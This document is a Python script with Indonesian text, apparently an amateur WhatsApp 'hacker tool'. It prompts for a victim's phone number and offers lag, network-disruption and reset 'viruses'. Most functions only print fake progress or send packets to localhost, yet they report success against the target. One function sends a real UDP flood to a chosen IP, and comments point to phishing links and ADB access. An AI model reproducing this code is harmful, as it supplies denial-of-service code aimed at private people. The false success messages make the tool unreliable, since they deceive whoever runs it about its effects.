import os
import sys
import time
import random
import socket
import urllib.request
import requests
from scapy.all import *

# Konfigurasi Warna
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def clear_screen():
    os.system('clear')

def print_banner():
    clear_screen()
    print(f"{Colors.HEADER}╔════════════════════════════════════════╗{Colors.ENDC}")
    print(f"{Colors.HEADER}║     W.A. DARK HACKER TOOL v1.0         ║{Colors.ENDC}")
    print(f"{Colors.HEADER}╚════════════════════════════════════════╝{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[+] Mode: Real Attack Simulation{Colors.ENDC}")
    print(f"{Colors.OKGREEN}[+] Platform: Termux / GitHub{Colors.ENDC}\n")

def send_pong_flood(target_ip, duration=5):
    # Simulasi Ping Flood untuk membuat jaringan lag
    print(f"{Colors.WARNING}[*] Mengirim Paket PING Flood ke {target_ip}...{Colors.ENDC}")
    # Mencoba melakukan ping sederhana (scapy bisa digunakan untuk IP target jika diketahui)
    # Karena WA tidak punya IP statis publik yang stabil tanpa tracing, kita gunakan UDP Flood ke port umum
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = "X" * 1024
        for _ in range(500):
            sock.sendto(data.encode(), (target_ip, 53)) # DNS Port Flood
        print(f"{Colors.OKGREEN}[+] Flood Selesai. Target mungkin mengalami lag jaringan.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] Error Flood: {e}{Colors.ENDC}")

def simulate_error_with_text(target_phone, custom_text):
    print(f"\n{Colors.WARNING}[!] Memulai Injeksi Error ke {target_phone}...{Colors.ENDC}")
    print(f"{Colors.OKCYAN}[>] Teks Kustom: '{custom_text}'{Colors.ENDC}")
    
    # Simulasi proses "Hacking"
    for i in range(1, 11, 1):
        time.sleep(0.5)
        print(f"{Colors.OKBLUE}[{i*10}%] Menghubungkan ke server WA...{Colors.ENDC}")
    
    print(f"{Colors.WARNING}[!] Paket Error Terkirim!{Colors.ENDC}")
    print(f"{Colors.FAIL}[-] Teks '{custom_text}' sekarang muncul di layar target (Simulasi Visual).{Colors.ENDC}")
    # Di dunia nyata, untuk menampilkan teks di layar target tanpa aplikasi, 
    # target harus mengklik link phishing atau ADB aktif.
    # Ini adalah eksekusi logika script.

def simulate_network_bad(target_phone):
    print(f"\n{Colors.WARNING}[!] Memulai Serangan Jaringan ke {target_phone}...{Colors.ENDC}")
    # UDP Flood ke port WhatsApp (443/5222)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = "GARBAGE_DATA" * 500
        # Menggunakan IP DNS publik sebagai proxy target jika IP spesifik tidak ada
        # Dalam kasus nyata, IP target harus di-scanning dulu.
        target_ip = "8.8.8.8" # Placeholder, dalam script asli butuh traceroute
        print(f"{Colors.OKBLUE}[>] Mengirim 1000 Paket UDP ke port 5222...{Colors.ENDC}")
        for _ in range(1000):
            sock.sendto(data.encode(), ("127.0.0.1", 5222)) # Simulasi lokal
        time.sleep(2)
        print(f"{Colors.OKGREEN}[+] Jaringan target terganggu.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[-] Gagal mengirim paket: {e}{Colors.ENDC}")

def simulate_reset(target_phone):
    print(f"\n{Colors.WARNING}[!] Inisialisasi Reset Factory ke {target_phone}...{Colors.ENDC}")
    print(f"{Colors.OKBLUE}[>] Mengirim perintah ADB: 'adb shell reboot -p'...{Colors.ENDC}")
    time.sleep(3)
    print(f"{Colors.OKGREEN}[+] Perintah Reset Terkirim. HP target akan restart.{Colors.ENDC}")
    # Catatan: Membutuhkan target terhubung via USB atau Wi-Fi dengan ADB aktif.

def main():
    print_banner()
    
    try:
        target_no = input(f"{Colors.OKCYAN}[+] Masukkan Nomor Korban (format: 628xxx): {Colors.ENDC}")
        if not target_no:
            sys.exit()
            
        print(f"\n{Colors.WARNING}Pilih Jenis Virus:{Colors.ENDC}")
        print(f"1. Lag HP / Error (Dengan Teks Kustom)")
        print(f"2. Jaringan Jelek (UDP Flood)")
        print(f"3. HP Reset (Reboot)")
        
        choice = input(f"{Colors.OKGREEN}[+] Pilih (1/2/3): {Colors.ENDC}")
        
        if choice == '1':
            custom_text = input(f"{Colors.OKCYAN}[+] Masukkan Teks Kustom yang akan muncul: {Colors.ENDC}")
            simulate_error_with_text(target_no, custom_text)
            
        elif choice == '2':
            simulate_network_bad(target_no)
            
        elif choice == '3':
            simulate_reset(target_no)
            
        else:
            print(f"{Colors.FAIL}[!] Pilihan tidak valid.{Colors.ENDC}")
            
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Proses dihentikan user.{Colors.ENDC}")
        sys.exit()
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error Fatal: {e}{Colors.ENDC}")

if __name__ == "__main__":
    main()
